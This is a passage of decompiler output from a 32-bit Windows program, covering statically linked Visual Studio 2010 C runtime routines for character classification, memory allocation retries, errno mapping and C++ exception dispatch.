    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 2;
  }
  else {
    uVar1 = __isctype_l(_C,2,(_locale_t)&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _islower
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _islower(int _C)

{
  uint uVar1;
  
  if (_DAT_003d7cf8 == 0) {
    return *(ushort *)(PTR_DAT_003d6dd0 + _C * 2) & 2;
  }
  uVar1 = __islower_l(_C,(_locale_t)0x0);
  return uVar1;
}



// Library Function - Single Match
//  __isdigit_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,(_locale_t)&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2010 Release

int __cdecl _isdigit(int _C)

{
  uint uVar1;
  
  if (_DAT_003d7cf8 == 0) {
    return *(ushort *)(PTR_DAT_003d6dd0 + _C * 2) & 4;
  }
  uVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return uVar1;
}



// Library Function - Single Match
//  ___init_ctype
// 
// Library: Visual Studio 2010 Release

int __cdecl ___init_ctype(threadlocinfo *_LocInfo)

{
  byte *pbVar1;
  byte bVar2;
  int iVar3;
  undefined4 *puVar4;
  BOOL BVar5;
  wchar_t *pwVar6;
  byte *pbVar7;
  LONG LVar8;
  undefined2 *puVar9;
  undefined4 in_EDX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint uVar10;
  undefined uVar11;
  threadlocinfo *ptVar12;
  undefined4 *local_30;
  undefined4 *local_2c;
  LPCSTR local_28;
  undefined4 *local_24;
  undefined4 *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_30 = (undefined4 *)0x0;
  local_20 = (undefined4 *)0x0;
  local_24 = (undefined4 *)0x0;
  local_2c = (undefined4 *)0x0;
  local_28 = (LPCSTR)0x0;
  if (_LocInfo->lc_category[0].wlocale == (wchar_t *)0x0) {
    ptVar12 = _LocInfo;
    if ((LONG *)_LocInfo[1].lc_collate_cp != (LONG *)0x0) {
      InterlockedDecrement((LONG *)_LocInfo[1].lc_collate_cp);
      in_EDX = extraout_EDX_00;
    }
    uVar11 = SUB41(ptVar12,0);
    _LocInfo[1].lc_collate_cp = 0;
    _LocInfo[1].lc_time_cp = 0;
    _LocInfo[1].lc_category[0].locale = " ";
    _LocInfo[1].lc_category[0].wlocale = (wchar_t *)&DAT_003c7018;
    _LocInfo[1].lc_category[0].refcount = (int *)&DAT_003c7198;
    _LocInfo->locale_name[3] = (wchar_t *)0x1;
    goto LAB_003b458f;
  }
  ptVar12 = _LocInfo;
  if (_LocInfo->lc_codepage == 0) {
    iVar3 = ___getlocaleinfo((_locale_t)&stack0xffffffb0,0,
                             (LPCWSTR)(uint)*(ushort *)&_LocInfo->lc_category[2].locale,0x1004,
                             &_LocInfo->lc_codepage);
    uVar11 = SUB41(ptVar12,0);
    if (iVar3 == 0) goto LAB_003b4256;
LAB_003b4520:
    _free(local_30);
    _free(local_20);
    _free(local_24);
    _free(local_2c);
  }
  else {
LAB_003b4256:
    uVar11 = SUB41(ptVar12,0);
    local_30 = (undefined4 *)__malloc_crt(4);
    local_20 = (undefined4 *)__calloc_crt(0x180,2);
    puVar4 = (undefined4 *)__calloc_crt(0x180,1);
    local_2c = (undefined4 *)__calloc_crt(0x180,1);
    local_28 = (LPCSTR)__calloc_crt(0x101,1);
    local_24 = puVar4;
    if ((((local_30 == (undefined4 *)0x0) || (local_20 == (undefined4 *)0x0)) ||
        (local_28 == (LPCSTR)0x0)) ||
       ((puVar4 == (undefined4 *)0x0 || (local_2c == (undefined4 *)0x0)))) goto LAB_003b4520;
    *local_30 = 0;
    iVar3 = 0;
    do {
      local_28[iVar3] = (CHAR)iVar3;
      iVar3 = iVar3 + 1;
    } while (iVar3 < 0x100);
    BVar5 = GetCPInfo(_LocInfo->lc_codepage,(LPCPINFO)&local_1c);
    if ((BVar5 == 0) || (5 < local_1c.MaxCharSize)) goto LAB_003b4520;
    pwVar6 = (wchar_t *)(local_1c.MaxCharSize & 0xffff);
    if (((wchar_t *)0x1 < pwVar6) && (local_1c.LeadByte[0] != '\0')) {
      pbVar7 = local_1c.LeadByte + 1;
      do {
        bVar2 = *pbVar7;
        if (bVar2 == 0) break;
        for (uVar10 = (uint)pbVar7[-1]; (int)uVar10 <= (int)(uint)bVar2; uVar10 = uVar10 + 1) {
          local_28[uVar10] = ' ';
          bVar2 = *pbVar7;
        }
        pbVar1 = pbVar7 + 1;
        pbVar7 = pbVar7 + 2;
      } while (*pbVar1 != 0);
    }
    BVar5 = ___crtGetStringTypeA
                      ((_locale_t)0x0,1,local_28,0x100,(LPWORD)(local_20 + 0x40),
                       _LocInfo->lc_codepage,0);
    if (((BVar5 == 0) ||
        (iVar3 = ___crtLCMapStringA((_locale_t)0x0,_LocInfo->lc_category[0].wlocale,0x100,
                                    local_28 + 1,0xff,(LPSTR)((int)puVar4 + 0x81),0xff,
                                    _LocInfo->lc_codepage,0), iVar3 == 0)) ||
       (iVar3 = ___crtLCMapStringA((_locale_t)0x0,_LocInfo->lc_category[0].wlocale,0x200,
                                   local_28 + 1,0xff,(LPSTR)((int)local_2c + 0x81),0xff,
                                   _LocInfo->lc_codepage,0), iVar3 == 0)) goto LAB_003b4520;
    *(undefined2 *)((int)local_20 + 0xfe) = 0;
    *(undefined *)((int)puVar4 + 0x7f) = 0;
    *(undefined *)((int)local_2c + 0x7f) = 0;
    *(undefined *)(puVar4 + 0x20) = 0;
    *(undefined *)(local_2c + 0x20) = 0;
    if (((wchar_t *)0x1 < pwVar6) && (local_1c.LeadByte[0] != '\0')) {
      pbVar7 = local_1c.LeadByte + 1;
      do {
        if (*pbVar7 == 0) break;
        local_24 = (undefined4 *)(uint)pbVar7[-1];
        if (local_24 <= (uint)*pbVar7) {
          puVar9 = (undefined2 *)((int)local_20 + (int)local_24 * 2 + 0x100);
          do {
            local_24 = (undefined4 *)((int)local_24 + 1);
            *puVar9 = 0x8000;
            puVar9 = puVar9 + 1;
          } while ((int)local_24 <= (int)(uint)*pbVar7);
        }
        pbVar1 = pbVar7 + 1;
        pbVar7 = pbVar7 + 2;
      } while (*pbVar1 != 0);
    }
    FUN_003aee70(local_20,local_20 + 0x80,0xfe);
    FUN_003aee70(puVar4,puVar4 + 0x40,0x7f);
    FUN_003aee70(local_2c,local_2c + 0x40,0x7f);
    if (((LONG *)_LocInfo[1].lc_collate_cp != (LONG *)0x0) &&
       (LVar8 = InterlockedDecrement((LONG *)_LocInfo[1].lc_collate_cp), LVar8 == 0)) {
      _free((void *)(_LocInfo[1].lc_time_cp - 0xfe));
      _free(_LocInfo[1].lc_category[0].wlocale + -0x40);
      _free(_LocInfo[1].lc_category[0].refcount + -0x20);
      _free((void *)_LocInfo[1].lc_collate_cp);
    }
    *local_30 = 1;
    _LocInfo[1].lc_collate_cp = (uint)local_30;
    _LocInfo[1].lc_category[0].locale = (char *)(local_20 + 0x40);
    _LocInfo[1].lc_time_cp = (uint)(undefined2 *)((int)local_20 + 0xfe);
    _LocInfo[1].lc_category[0].wlocale = (wchar_t *)(puVar4 + 0x20);
    _LocInfo[1].lc_category[0].refcount = local_2c + 0x20;
    _LocInfo->locale_name[3] = pwVar6;
  }
  _free(local_28);
  in_EDX = extraout_EDX;
LAB_003b458f:
  iVar3 = terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,in_EDX,uVar11);
  return iVar3;
}



// Library Function - Single Match
//  ____lc_codepage_func
// 
// Library: Visual Studio 2010 Release

UINT __cdecl ____lc_codepage_func(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  ptVar2 = p_Var1->ptlocinfo;
  if ((ptVar2 != (pthreadlocinfo)PTR_DAT_003d6de0) && ((p_Var1->_ownlocale & DAT_003d6b98) == 0)) {
    ptVar2 = ___updatetlocinfo();
  }
  return ptVar2->lc_codepage;
}



// Library Function - Single Match
//  ____lc_handle_func
// 
// Library: Visual Studio 2010 Release

uint * ____lc_handle_func(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  ptVar2 = p_Var1->ptlocinfo;
  if ((ptVar2 != (pthreadlocinfo)PTR_DAT_003d6de0) && ((p_Var1->_ownlocale & DAT_003d6b98) == 0)) {
    ptVar2 = ___updatetlocinfo();
  }
  return &ptVar2->lc_time_cp;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_DAT_003d7cfc == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (_DAT_003d7cfc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (_DAT_003d7cfc == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (_DAT_003d7cfc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (_DAT_003d7cfc == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (_DAT_003d7cfc < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __get_errno_from_oserr
// 
// Library: Visual Studio 2010 Release

int __cdecl __get_errno_from_oserr(ulong param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  do {
    if (param_1 == (&DAT_003d64d0)[uVar1 * 2]) {
      return (&DAT_003d64d4)[uVar1 * 2];
    }
    uVar1 = uVar1 + 1;
  } while (uVar1 < 0x2d);
  if (param_1 - 0x13 < 0x12) {
    return 0xd;
  }
  return (-(uint)(0xe < param_1 - 0xbc) & 0xe) + 8;
}



// Library Function - Single Match
//  __errno
// 
// Library: Visual Studio 2010 Release

int * __cdecl __errno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (int *)&DAT_003d6638;
  }
  return &p_Var1->_terrno;
}



// Library Function - Single Match
//  ___doserrno
// 
// Library: Visual Studio 2010 Release

ulong * __cdecl ___doserrno(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd_noexit();
  if (p_Var1 == (_ptiddata)0x0) {
    return (ulong *)&DAT_003d663c;
  }
  return &p_Var1->_tdoserrno;
}



// Library Function - Single Match
//  __dosmaperr
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __dosmaperr(ulong param_1)

{
  ulong *puVar1;
  int iVar2;
  int *piVar3;
  
  puVar1 = ___doserrno();
  *puVar1 = param_1;
  iVar2 = __get_errno_from_oserr(param_1);
  piVar3 = __errno();
  *piVar3 = iVar2;
  return;
}



undefined ** __thiscall FUN_003b475f(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_exception::vftable;
  FUN_003b0a88((undefined **)this);
  if ((param_1 & 1) != 0) {
    FUN_003aee4b(this);
  }
  return (undefined **)this;
}



// Library Function - Single Match
//  ___TypeMatch
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl ___TypeMatch(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_003b47de:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_003b47bd:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_003b47de;
    }
    else {
      iVar1 = _strcmp((char *)(iVar1 + 8),(char *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_003b47bd;
    }
    uVar2 = 0;
  }
  return uVar2;
}



// Library Function - Single Match
//  ___FrameUnwindFilter
// 
// Library: Visual Studio 2010 Release

_ptiddata __cdecl ___FrameUnwindFilter(int **param_1)

{
  int iVar1;
  _ptiddata p_Var2;
  
  iVar1 = **param_1;
  if ((iVar1 == -0x1fbcbcae) || (iVar1 == -0x1fbcb0b3)) {
    p_Var2 = __getptd();
    if (0 < p_Var2->_ProcessingThrow) {
      p_Var2 = __getptd();
      p_Var2->_ProcessingThrow = p_Var2->_ProcessingThrow + -1;
    }
  }
  else {
    if (iVar1 == -0x1f928c9d) {
      p_Var2 = __getptd();
      p_Var2->_ProcessingThrow = 0;
      terminate();
      return p_Var2;
    }
  }
  return (_ptiddata)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___FrameUnwindToState
// 
// Library: Visual Studio 2010 Release

void __cdecl ___FrameUnwindToState(int param_1,undefined4 param_2,int param_3,int param_4)

{
  _ptiddata p_Var1;
  int iVar2;
  int iVar3;
  
  if (*(int *)(param_3 + 4) < 0x81) {
    iVar2 = (int)*(char *)(param_1 + 8);
  }
  else {
    iVar2 = *(int *)(param_1 + 8);
  }
  p_Var1 = __getptd();
  p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + 1;
  while (iVar3 = iVar2, iVar3 != param_4) {
    if ((iVar3 < 0) || (*(int *)(param_3 + 4) <= iVar3)) {
      _inconsistency();
    }
    iVar2 = *(int *)(*(int *)(param_3 + 8) + iVar3 * 8);
    if (*(int *)(*(int *)(param_3 + 8) + 4 + iVar3 * 8) != 0) {
      *(int *)(param_1 + 8) = iVar2;
      __CallSettingFrame_12(*(undefined4 *)(*(int *)(param_3 + 8) + 4 + iVar3 * 8),param_1,0x103);
    }
  }
  FUN_003b48f6();
  if (iVar3 != param_4) {
    _inconsistency();
  }
  *(int *)(param_1 + 8) = iVar3;
  return;
}



void FUN_003b48f6(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (0 < p_Var1->_ProcessingThrow) {
    p_Var1 = __getptd();
    p_Var1->_ProcessingThrow = p_Var1->_ProcessingThrow + -1;
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___DestructExceptionObject
// 
// Library: Visual Studio 2010 Release

void __cdecl ___DestructExceptionObject(int *param_1)

{
  undefined *UNRECOVERED_JUMPTABLE;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[7] != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(undefined **)(param_1[7] + 4),
     UNRECOVERED_JUMPTABLE != (undefined *)0x0)) {
    FID_conflict__CallMemberFunction1(param_1[6],UNRECOVERED_JUMPTABLE);
  }
  return;
}



// Library Function - Single Match
//  ___AdjustPointer
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl ___AdjustPointer(int param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = *param_2 + param_1;
  if (-1 < param_2[1]) {
    iVar1 = iVar1 + *(int *)(*(int *)(param_2[1] + param_1) + param_2[2]) + param_2[1];
  }
  return iVar1;
}



uint FUN_003b49d3(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  return (uint)p_Var1 & 0xffffff00 | (uint)(p_Var1->_ProcessingThrow != 0);
}



// Library Function - Single Match
//  unsigned char __cdecl IsInExceptionSpec(struct EHExceptionRecord *,struct _s_ESTypeList const *)
// 
// Library: Visual Studio 2010 Release

unsigned_char __cdecl IsInExceptionSpec(EHExceptionRecord *param_1,_s_ESTypeList *param_2)

{
  uint in_EAX;
  int iVar1;
  byte *pbVar2;
  byte **ppbVar3;
  int *unaff_EDI;
  uint local_c;
  byte local_5;
  
  if (unaff_EDI == (int *)0x0) {
    _inconsistency();
    terminate();
  }
  local_c = 0;
  local_5 = 0;
  if (0 < *unaff_EDI) {
    do {
      ppbVar3 = *(byte ***)(*(int *)(param_1 + 0x1c) + 0xc);
      pbVar2 = *ppbVar3;
      if (0 < (int)pbVar2) {
        do {
          ppbVar3 = ppbVar3 + 1;
          iVar1 = ___TypeMatch((byte *)(unaff_EDI[1] + local_c * 0x10),*ppbVar3,
                               *(uint **)(param_1 + 0x1c));
          if (iVar1 != 0) {
            local_5 = 1;
            break;
          }
          pbVar2 = pbVar2 + -1;
        } while (0 < (int)pbVar2);
      }
      in_EAX = local_c + 1;
      local_c = in_EAX;
    } while ((int)in_EAX < *unaff_EDI);
  }
  return in_EAX & 0xffffff00 | (uint)local_5;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3

void FUN_003b4a5f(void *param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if (p_Var1->_curexcspec != (void *)0x0) {
    _inconsistency();
  }
  FUN_003ba6a4();
  terminate();
  p_Var1 = __getptd();
  p_Var1->_curexcspec = param_1;
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



void Catch_All_003b4a90(void)

{
  _ptiddata p_Var1;
  int unaff_EBP;
  
  p_Var1 = __getptd();
  p_Var1->_curexcspec = *(void **)(unaff_EBP + 8);
                    // WARNING: Subroutine does not return
  __CxxThrowException_8(0,(byte *)0x0);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  void * __cdecl CallCatchBlock(struct EHExceptionRecord *,struct EHRegistrationNode *,struct
// _CONTEXT *,struct _s_FuncInfo const *,void *,int,unsigned long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
CallCatchBlock(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,
              _s_FuncInfo *param_4,void *param_5,int param_6,unsigned_long param_7)

{
  _ptiddata p_Var1;
  void *in_ECX;
  undefined4 local_40 [2];
  undefined4 local_38;
  void *local_34;
  void *local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  void *local_20;
  undefined4 uStack12;
  undefined *local_8;
  
  local_8 = &DAT_003d2d48;
  uStack12 = 0x3b4ab4;
  local_38 = 0;
  local_28 = *(undefined4 *)(param_2 + -4);
  local_2c = __CreateFrameInfo(local_40,*(undefined4 *)(param_1 + 0x18));
  p_Var1 = __getptd();
  local_30 = p_Var1->_curexception;
  p_Var1 = __getptd();
  local_34 = p_Var1->_curcontext;
  p_Var1 = __getptd();
  p_Var1->_curexception = param_1;
  p_Var1 = __getptd();
  p_Var1->_curcontext = param_3;
  local_8 = (undefined *)0x1;
  local_20 = _CallCatchBlock2(param_2,param_4,in_ECX,(int)param_5,param_6);
  local_8 = (undefined *)0xfffffffe;
  FUN_003b4bce();
  return local_20;
}



void FUN_003b4bce(void)

{
  _ptiddata p_Var1;
  int iVar2;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  *(undefined4 *)(unaff_EDI + -4) = *(undefined4 *)(unaff_EBP + -0x24);
  __FindAndUnlinkFrame(*(void **)(unaff_EBP + -0x28));
  p_Var1 = __getptd();
  p_Var1->_curexception = *(void **)(unaff_EBP + -0x2c);
  p_Var1 = __getptd();
  p_Var1->_curcontext = *(void **)(unaff_EBP + -0x30);
  if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&
      ((iVar2 = unaff_ESI[5], iVar2 == 0x19930520 ||
       ((iVar2 == 0x19930521 || (iVar2 == 0x19930522)))))) &&
     ((*(int *)(unaff_EBP + -0x34) == 0 && (*(int *)(unaff_EBP + -0x1c) != 0)))) {
    iVar2 = __IsExceptionObjectToBeDestroyed(unaff_ESI[6]);
    if (iVar2 != 0) {
      ___DestructExceptionObject(unaff_ESI);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObjectHelper
// 
// Library: Visual Studio 2010 Release

char __cdecl ___BuildCatchObjectHelper(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  int iVar1;
  void *pvVar2;
  size_t _Size;
  unsigned_int in_stack_ffffffd0;
  
  if (((param_3[1] == 0) || (*(char *)(param_3[1] + 8) == '\0')) ||
     ((param_3[2] == 0 && ((*param_3 & 0x80000000) == 0)))) {
    return '\0';
  }
  if (-1 < (int)*param_3) {
    param_2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  if ((*param_3 & 8) == 0) {
    pvVar2 = *(void **)(param_1 + 0x18);
    if ((*param_4 & 1) == 0) {
      if (*(int *)(param_4 + 0x18) == 0) {
        iVar1 = _ValidateRead(pvVar2,1);
        if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
          _Size = *(size_t *)(param_4 + 0x14);
          pvVar2 = (void *)___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
          FID_conflict__memcpy(param_2,pvVar2,_Size);
          return '\0';
        }
      }
      else {
        iVar1 = _ValidateRead(pvVar2,1);
        if (((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) &&
           (iVar1 = _ValidateRead(*(void **)(param_4 + 0x18),in_stack_ffffffd0), iVar1 != 0)) {
          return ((*param_4 & 4) != 0) + '\x01';
        }
      }
    }
    else {
      iVar1 = _ValidateRead(pvVar2,1);
      if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
        FID_conflict__memcpy(param_2,*(void **)(param_1 + 0x18),*(size_t *)(param_4 + 0x14));
        if (*(int *)(param_4 + 0x14) != 4) {
          return '\0';
        }
        iVar1 = *param_2;
        if (iVar1 == 0) {
          return '\0';
        }
        goto LAB_003b4cc9;
      }
    }
  }
  else {
    iVar1 = _ValidateRead(*(void **)(param_1 + 0x18),1);
    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_003b4cc9:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else {
    if (CONCAT31(extraout_var,cVar1) == 2) {
      ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
      FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2010 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,unsigned_char param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(unsigned_long)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2010 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  _ptiddata p_Var1;
  void *pvVar2;
  int iVar3;
  _s_TryBlockMapEntry *p_Var4;
  int *piVar5;
  int iVar6;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint in_stack_fffffff0;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var1 = __getptd();
    if (p_Var1->_translator != (void *)0x0) {
      p_Var1 = __getptd();
      pvVar2 = (void *)FUN_003b779f();
      if ((((p_Var1->_translator != pvVar2) && (*(int *)param_1 != -0x1fbcb0b3)) &&
          (*(int *)param_1 != -0x1fbcbcae)) &&
         (iVar3 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar3 != 0)) {
        return;
      }
    }
    if (param_5->nTryBlocks == 0) {
      _inconsistency();
    }
    p_Var4 = _GetRangeOfTrysToCheck
                       (param_5,param_7,param_6,&local_8,(unsigned_int *)&stack0xfffffff0);
    if (local_8 < in_stack_fffffff0) {
      piVar5 = &p_Var4->nCatches;
      do {
        if ((piVar5[-3] <= param_6) && (param_6 <= piVar5[-2])) {
          iVar6 = *piVar5 * 0x10 + piVar5[1];
          iVar3 = *(int *)(iVar6 + -0xc);
          if (((iVar3 == 0) || (*(char *)(iVar3 + 8) == '\0')) &&
             ((*(byte *)(iVar6 + -0x10) & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,in_stack_fffffff0);
          }
        }
        local_8 = local_8 + 1;
        piVar5 = piVar5 + 5;
      } while (local_8 < in_stack_fffffff0);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
